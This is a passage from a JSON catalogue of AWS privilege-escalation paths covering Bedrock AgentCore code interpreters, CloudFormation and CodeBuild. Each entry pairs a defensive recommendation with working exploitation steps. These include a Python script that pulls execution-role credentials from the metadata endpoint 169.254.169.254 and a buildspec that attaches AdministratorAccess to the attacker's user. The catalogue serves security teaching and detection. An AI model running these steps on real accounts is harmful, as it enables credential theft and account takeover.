          "description": "New Bedrock AgentCore code interpreter created with a privileged execution role. Code interpreters run on Firecracker MicroVMs and can access the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to EC2's IMDS.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the bedrock-agentcore Service",
          "type": "resource",
          "description": "IAM role passed to the code interpreter as the execution role. The role must trust bedrock-agentcore.amazonaws.com to assume it. Credentials are available via the MMDS at the execution_role endpoint.\n"
        },
        {
          "id": "exfiltrate_creds",
          "label": "Exfiltrate Credentials",
          "type": "action",
          "color": "#99ccff",
          "description": "Start a session with the code interpreter and invoke Python code to query the MicroVM Metadata Service (MMDS) and retrieve the target role's temporary credentials.\n\nThe Python code uses boto3 to:\n1. Start a code interpreter session\n2. Execute a curl command targeting 169.254.169.254/latest/meta-data/iam/security-credentials/execution_role\n3. Extract AccessKeyId, SecretAccessKey, and SessionToken\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The attacker successfully exfiltrated credentials from the code interpreter and the target role has AdministratorAccess or equivalent permissions. The attacker now has full administrative access to the AWS account.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The attacker successfully exfiltrated credentials from the code interpreter and the target role has some elevated permissions (but not full admin). This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "Minimal Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The attacker successfully exfiltrated credentials from the code interpreter, but the target role only has minimal permissions. Limited usefulness for privilege escalation.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "code_interpreter",
          "label": "iam:PassRole + bedrock-agentcore:CreateCodeInterpreter",
          "description": "Create a new Bedrock AgentCore code interpreter and pass the target role to it as the execution role. The code interpreter runs on a Firecracker MicroVM with network access to the MMDS.\n\nCommand:\n```bash\naws bedrock-agentcore-control create-code-interpreter \\\n  --name privesc \\\n  --network-configuration '{\"networkMode\":\"SANDBOX\"}' \\\n  --execution-role-arn $EXECUTION_ROLE\n```\n"
        },
        {
          "from": "code_interpreter",
          "to": "target_role",
          "label": "Interpreter assumes role",
          "description": "The code interpreter automatically assumes the passed execution role. Credentials become available via the MicroVM Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role\n"
        },
        {
          "from": "target_role",
          "to": "exfiltrate_creds",
          "label": "bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter",
          "description": "Start a session with the code interpreter and invoke Python code to extract credentials from the MMDS.\n\nCommands:\n```bash\n# Start session\nbedrock_agentcore_client.start_code_interpreter_session(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID\n)\n\n# Invoke code to query MMDS\ncode = 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role'\nbedrock_agentcore_client.invoke_code_interpreter(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n  sessionId=session_id,\n  name='executeCommand',\n  arguments={'command': code}\n)\n```\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "admin",
          "label": "If target role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access by using the exfiltrated credentials.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "some_perms",
          "label": "If target role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has some elevated permissions (data access, further escalation paths), the attacker can leverage the exfiltrated credentials for lateral movement or additional attacks.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "no_access",
          "label": "If target role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal permissions (like logs:PutLogEvents), the exfiltrated credentials provide limited value for privilege escalation.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/bedrock/bedrock-001.yaml"
  },
  {
    "id": "bedrock-002",
    "name": "bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter",
    "category": "access-resource",
    "services": [
      "bedrock-agentcore"
    ],
    "description": "A principal with `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter` can access an existing Bedrock AgentCore code interpreter that has a privileged IAM execution role attached. By starting a session and invoking arbitrary Python code within the interpreter, an attacker can access the MicroVM Metadata Service (MMDS) at 169.254.169.254 to retrieve temporary credentials for the interpreter's execution role. This path doesn't require `iam:PassRole` since the role is already attached to the existing interpreter. Similar to `lambda:UpdateFunctionCode`, this targets existing resources rather than creating new ones.",
    "prerequisites": {
      "admin": [
        "A Bedrock AgentCore code interpreter must exist with an IAM execution role attached",
        "The interpreter's role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
        "The interpreter must be in a running or ready state"
      ],
      "lateral": [
        "A Bedrock AgentCore code interpreter must exist with an IAM execution role attached",
        "The interpreter must be in a running or ready state"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws bedrock-agentcore-control list-code-interpreters",
          "description": "List existing code interpreters to find targets with privileged roles"
        },
        {
          "step": 2,
          "command": "aws bedrock-agentcore-control get-code-interpreter --code-interpreter-id INTERPRETER_ID",
          "description": "Check the interpreter's execution role ARN to confirm elevated permissions"
        },
        {
          "step": 3,
          "command": "cat << 'EOF' > \"get_secrets_from_interpreter.py\"\nimport boto3\nimport sys\nbedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])\nCODE_INTERPRETER_ID = sys.argv[1]\n\nsession = bedrock_agentcore_client.start_code_interpreter_session(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n)\nsession_id = session['sessionId']\n\ncode = 'IP=\"169.254.169.254\"; METADATA=\"meta-data\"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'\n\nresponse = bedrock_agentcore_client.invoke_code_interpreter(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n  sessionId=session_id,\n  name='executeCommand',\n  arguments={'command': code}\n)\n\nfor event in response['stream']:\n  if event['result']['structuredContent']['stdout']:\n    print(event['result']['structuredContent']['stdout'])\nEOF\n",
          "description": "Create the python file that will invoke the existing interpreter"
        },
        {
          "step": 4,
          "command": "CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)\necho export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r \".AccessKeyId\")\necho export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r \".SecretAccessKey\")\necho export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r \".Token\")\n",
          "description": "Run the python file using the $INTERPRETER_ID to extract credentials"
        },
        {
          "step": 5,
          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
          "description": "Use the stolen credentials to assume the privileged role's permissions"
        }
      ]
    },
    "recommendation": "Restrict the `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter`\npermissions using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\n    \"bedrock-agentcore:StartCodeInterpreterSession\",\n    \"bedrock-agentcore:InvokeCodeInterpreter\"\n  ],\n  \"Resource\": \"arn:aws:bedrock-agentcore:REGION:ACCOUNT_ID:code-interpreter/SpecificInterpreter\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `StartCodeInterpreterSession` and `InvokeCodeInterpreter` events on sensitive code interpreters\n- Alert on session creation for interpreters with administrative roles\n- Implement resource tags and condition keys to restrict code interpreter usage\n- Regularly audit execution roles attached to code interpreters\n- Use SCPs to restrict access to sensitive interpreters\n- Enable CloudTrail Data Event logging for code interpreter invocations\n- Implement network isolation for code interpreters processing sensitive data\n- Review and minimize execution role permissions on existing interpreters\n",
    "discoveredBy": {
      "name": "Nigel Sood",
      "organization": "Sonrai Security",
      "date": "2025"
    },
    "references": [
      {
        "title": "AWS AgentCore: The Overlooked Privilege Escalation Path in Bedrock AI Tooling",
        "url": "https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/"
      },
      {
        "title": "Sandboxed to Compromised: New Research Exposes Credential Exfiltration Paths in AWS Code Interpreters",
        "url": "https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/"
      },
      {
        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
      }
    ],
    "relatedPaths": [
      "bedrock-001",
      "lambda-003",
      "glue-002",
      "ec2-002"
    ],
    "permissions": {
      "required": [
        {
          "permission": "bedrock-agentcore:StartCodeInterpreterSession",
          "resourceConstraints": "Target code interpreter must be in the Resource section"
        },
        {
          "permission": "bedrock-agentcore:InvokeCodeInterpreter",
          "resourceConstraints": "Target code interpreter must be in the Resource section"
        }
      ],
      "additional": [
        {
          "permission": "bedrock-agentcore:ListCodeInterpreters",
          "resourceConstraints": "List the interpreters that already exist"
        },
        {
          "permission": "bedrock-agentcore:GetCodeInterpreter",
          "resourceConstraints": "Identify the role associated with the session"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with bedrock-agentcore:StartCodeInterpreterSession and bedrock-agentcore:InvokeCodeInterpreter permissions. Can be an IAM user or role. This attack targets an existing code interpreter rather than creating a new one, so iam:PassRole is not required.\n"
        },
        {
          "id": "code_interpreter",
          "label": "Existing Code Interpreter",
          "type": "resource",
          "description": "An existing Bedrock AgentCore code interpreter with a privileged execution role already attached. The interpreter runs on a Firecracker MicroVM and has access to the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to EC2's IMDS.\n"
        },
        {
          "id": "exfiltrate_creds",
          "label": "Exfiltrate Credentials",
          "type": "action",
          "color": "#99ccff",
          "description": "Start a session with the existing code interpreter and invoke Python code to query the MicroVM Metadata Service (MMDS) and retrieve the execution role's temporary credentials.\n\nThe Python code uses boto3 to:\n1. Start a code interpreter session (bedrock-agentcore:StartCodeInterpreterSession)\n2. Invoke code to execute a curl command targeting 169.254.169.254/latest/meta-data/iam/security-credentials/execution_role\n3. Extract AccessKeyId, SecretAccessKey, and SessionToken from the MMDS response\n\nThis is similar to exfiltrating credentials from an EC2 instance via IMDS, but targets the MicroVM's metadata service instead.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The attacker successfully exfiltrated credentials from the code interpreter and the execution role has AdministratorAccess or equivalent permissions. The attacker now has full administrative access to the AWS account using the stolen credentials.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The attacker successfully exfiltrated credentials from the code interpreter and the execution role has some elevated permissions (but not full admin). This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths. The attacker should enumerate the role's permissions to determine what additional access was gained.\n"
        },
        {
          "id": "no_access",
          "label": "Minimal Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The attacker successfully exfiltrated credentials from the code interpreter, but the execution role only has minimal permissions (e.g., logs:PutLogEvents). Limited usefulness for privilege escalation.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "code_interpreter",
          "label": "Target existing code interpreter",
          "description": "Identify an existing code interpreter that has a privileged execution role attached. Use bedrock-agentcore:ListCodeInterpreters to discover available interpreters and bedrock-agentcore:GetCodeInterpreter to check their execution role ARNs.\n\nCommands:\n```bash\n# List existing code interpreters\naws bedrock-agentcore-control list-code-interpreters\n\n# Check execution role of specific interpreter\naws bedrock-agentcore-control get-code-interpreter \\\n  --code-interpreter-id INTERPRETER_ID\n```\n"
        },
        {
          "from": "code_interpreter",
          "to": "exfiltrate_creds",
          "label": "bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter",
          "description": "Start a session with the existing code interpreter and invoke Python code to extract credentials from the MicroVM Metadata Service (MMDS).\n\nExecute the Python script that:\n1. Starts a code interpreter session\n2. Executes: `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role`\n3. Parses the JSON response to extract AccessKeyId, SecretAccessKey, and SessionToken\n\nCommand:\n```bash\n# Run the credential extraction script\npython3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION\n```\n\nThe Python script uses the bedrock-agentcore API to invoke arbitrary code within the MicroVM, which can then query the MMDS just like an EC2 instance queries IMDS.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "admin",
          "label": "If execution role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the code interpreter's execution role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access by using the exfiltrated credentials. The attacker can now perform any action in the AWS account.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "some_perms",
          "label": "If execution role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the execution role has some elevated permissions (data access, further escalation paths), the attacker can leverage the exfiltrated credentials for lateral movement or additional attacks. The attacker should use `aws sts get-caller-identity` and enumerate permissions to determine what additional access was gained.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "no_access",
          "label": "If execution role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the execution role only has minimal permissions (like logs:PutLogEvents or basic CloudWatch metrics), the exfiltrated credentials provide limited value for privilege escalation. The attacker may need to target a different code interpreter with a more privileged role.\n"
        }
      ]
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/bedrockagentcore-startsession+invoke",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/hands-on-labs/lab/bedrock-agentcore-privilege-escalation-via-code-interpreters/",
        "scenarioPricingModel": "paid"
      }
    },
    "detectionTools": {
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L1375"
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/bedrock/bedrock-002.yaml"
  },
  {
    "id": "cloudformation-001",
    "name": "iam:PassRole + cloudformation:CreateStack",
    "category": "service-passrole",
    "services": [
      "iam",
      "cloudformation"
    ],
    "description": "A principal with `iam:PassRole` and `cloudformation:CreateStack` can launch a CloudFormation template that creates AWS resources. The template executes with the permissions of the passed IAM role. This allows creation of resources controlled by the attacker, such as IAM users, Lambda functions, or EC2 instances. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts cloudformation.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A role must exist that trusts cloudformation.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws cloudformation create-stack --stack-name privesc-stack --template-body file://exploit-template.yaml --capabilities CAPABILITY_IAM --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
          "description": "Create a CloudFormation stack with a template that creates privileged resources"
        },
        {
          "step": 2,
          "command": "aws cloudformation describe-stacks --stack-name privesc-stack",
          "description": "Monitor stack creation progress"
        },
        {
          "step": 3,
          "command": "# Access the newly created resources (e.g., IAM user, Lambda function)",
          "description": "Use the elevated privileges of the created resources"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run cloudformation__create_stack --stack-name privesc-stack --template exploit-template.yaml --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
          "description": "Use Pacu to create CloudFormation stack with privileged role"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"`iam:PassRole`\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificCFNRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"`iam:PassedToService`\": \"cloudformation.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `cloudformation:CreateStack` to specific stack name patterns or templates\n- Use CloudFormation service roles with minimal required permissions\n- Enable CloudFormation stack policies to prevent unauthorized modifications\n- Monitor CloudTrail for CloudFormation stack creation and the resources they provision\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - PassExistingRoleToCloudFormation",
        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc20-PassExistingRoleToCloudFormation.tf"
      }
    ],
    "relatedPaths": [
      "ec2-001",
      "lambda-001"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py#L109-L132",
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L155-L157",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L465-L470",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L68-L72"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole-cloudformation",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "CloudFormation-PassExistingRoleToCloudFormation",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "cloudformation:CreateStack",
          "resourceConstraints": "Must have permission to create CloudFormation stacks"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole` and `cloudformation:CreateStack` permissions. This principal will create a CloudFormation stack that executes with a privileged role's permissions.\n"
        },
        {
          "id": "cfn_stack",
          "label": "New CloudFormation Stack",
          "type": "resource",
          "description": "The newly created CloudFormation stack with a malicious template. The stack is created with `cloudformation:CreateStack` and configured to use a privileged IAM role via `iam:PassRole`. The template defines AWS resources to be created with the target role's permissions.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the cloudformation Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the CloudFormation stack during creation. This role must trust cloudformation.amazonaws.com as a principal in its trust policy. When CloudFormation creates resources, it uses this role's permissions.\n"
        },
        {
          "id": "execute_template",
          "label": "Execute Template Resources",
          "type": "action",
          "color": "#99ccff",
          "description": "The CloudFormation template executes with the target role's permissions, creating AWS resources defined in the template. Common resources for privilege escalation include IAM users with access keys, Lambda functions, EC2 instances with User Data scripts, or IAM policies/roles that grant the starting principal elevated access.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the CloudFormation template can create resources that grant the attacker full administrative access to the AWS account. For example, the template could create an IAM user with AdministratorAccess and access keys for the attacker.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the CloudFormation template can create resources that grant partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB) or resources that enable additional privilege escalation techniques.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or no interesting permissions, the CloudFormation template cannot create resources that provide meaningful additional access to the attacker. Limited usefulness for privilege escalation.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "cfn_stack",
          "label": "iam:PassRole + cloudformation:CreateStack",
          "description": "The attacker creates a new CloudFormation stack and passes a privileged role to it. The stack is created with a malicious template (YAML or JSON) that defines AWS resources to be provisioned.\n\nCommand:\n```bash\naws cloudformation create-stack \\\n  --stack-name privesc-stack \\\n  --template-body file://exploit-template.yaml \\\n  --capabilities CAPABILITY_IAM \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n```\n\nThe exploit-template.yaml contains resource definitions that will execute with the target role's permissions. Note the `--capabilities CAPABILITY_IAM` flag is required when the template creates IAM resources.\n"
        },
        {
          "from": "cfn_stack",
          "to": "target_role",
          "label": "Stack assumes role",
          "description": "When the CloudFormation stack is created, the CloudFormation service automatically assumes the target role. All resource creation operations in the template execute with the permissions granted to this role.\n"
        },
        {
          "from": "target_role",
          "to": "execute_template",
          "label": "CloudFormation provisions resources",
          "description": "CloudFormation provisions the resources defined in the template using the target role's permissions. The template can create any AWS resources the role has permissions for, such as IAM users with access keys, Lambda functions, EC2 instances, S3 buckets, or IAM policies and roles.\n\nMonitor stack progress:\n```bash\naws cloudformation describe-stacks \\\n  --stack-name privesc-stack\n```\n\nThe created resources can then be accessed by the attacker to gain elevated privileges.\n"
        },
        {
          "from": "execute_template",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent administrative permissions, the CloudFormation template can create resources that grant the attacker full control over the AWS account. For example, the template could create an IAM user with AdministratorAccess policy attached and generate access keys that are output in the stack outputs or stored in an S3 bucket the attacker can access.\n"
        },
        {
          "from": "execute_template",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the CloudFormation template can create resources that grant partial privilege escalation. This might include Lambda functions with data access, EC2 instances with privileged instance profiles, or IAM policies that enable additional privilege escalation techniques. The attacker gains access through the newly created resources.\n"
        },
        {
          "from": "execute_template",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions, the CloudFormation template cannot create resources that provide meaningful additional access. The privilege escalation attempt may not yield significant results, though even limited access could be useful for reconnaissance or as part of a multi-step attack chain.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/cloudformation/cloudformation-001.yaml"
  },
  {
    "id": "codebuild-001",
    "name": "iam:PassRole + codebuild:CreateProject + codebuild:StartBuild",
    "category": "service-passrole",
    "services": [
      "iam",
      "codebuild"
    ],
    "description": "A principal with `iam:PassRole`, `codebuild:CreateProject`, and `codebuild:StartBuild` can create a new CodeBuild project and attach an existing privileged IAM role to it. By starting a build with a malicious buildspec, the attacker can execute arbitrary code with the permissions of the attached role, allowing privilege escalation. This is a classic \"pass role to service\" privilege escalation pattern where the combination of service creation, role passing, and execution permissions creates an indirect path to elevated privileges. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts codebuild.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "A role must exist that trusts codebuild.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`codebuild.amazonaws.com`]].RoleName'",
          "description": "Discover roles that trust codebuild.amazonaws.com (optional but helpful for finding privileged roles to pass)"
        },
        {
          "step": 2,
          "command": "aws codebuild create-project --name privesc-project \\\n  --source type=NO_SOURCE,buildspec=\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - echo \\\"Starting privilege escalation...\\\"\\n      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n      - echo \\\"Successfully attached AdministratorAccess!\\\"\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \\\n  --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n",
          "description": "Create a CodeBuild project with the privileged role and malicious buildspec that attaches AdministratorAccess to your user"
        },
        {
          "step": 3,
          "command": "aws codebuild start-build --project-name privesc-project",
          "description": "Start the build to execute code with elevated privileges"
        },
        {
          "step": 4,
          "command": "aws codebuild batch-get-builds --ids BUILD_ID",
          "description": "Monitor the build status and wait for completion"
        },
        {
          "step": 5,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
        }
      ]
    },
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.\n\nThis attack requires:\n1. The ability to create CodeBuild projects (`codebuild:CreateProject`)\n2. The ability to start builds (`codebuild:StartBuild`)\n3. The ability to pass a role to CodeBuild service (`iam:PassRole`)\n4. A role that trusts codebuild.amazonaws.com\n",
    "recommendation": "Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificCodeBuildRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"codebuild.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- **Separate Permissions**: Avoid granting `codebuild:CreateProject` and `iam:PassRole` to the same principal\n- **Restrict CodeBuild Project Creation**: Limit `codebuild:CreateProject` to specific project name patterns or require approval workflows\n- **Service Role Controls**: Ensure CodeBuild service roles follow least privilege and cannot modify IAM permissions\n- **Monitor CloudTrail**: Alert on `CreateProject` API calls where privileged roles are being passed, and monitor `StartBuild` executions\n- **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls from CodeBuild service principals\n- **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies\n- **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild and PassRole\n- **Require Source Control**: Configure organizational policies to require buildspecs from source control repositories rather than inline definitions\n- **Role Trust Policies**: Review roles that trust codebuild.amazonaws.com and ensure they follow least privilege\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - CodeBuild PassRole",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      },
      {
        "title": "AWS CodeBuild API Reference - CreateProject",
        "url": "https://docs.aws.amazon.com/codebuild/latest/APIReference/API_CreateProject.html"
      }
    ],
    "relatedPaths": [
      "codebuild-002",
      "codebuild-003",
      "codebuild-004",
      "ec2-001",
      "lambda-001",
      "cloudformation-001"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/codebuild_edges.py#L227-L245"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+codebuild-createproject+codebuild-startbuild",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "CodeBuild-CreateProjectPassRole",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section and must trust codebuild.amazonaws.com"
        },
        {
          "permission": "codebuild:CreateProject",
          "resourceConstraints": "Must have permission to create CodeBuild projects"
        },
        {
          "permission": "codebuild:StartBuild",
          "resourceConstraints": "Must have permission to start builds on the created project"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles that trust CodeBuild to pass"
        },
        {
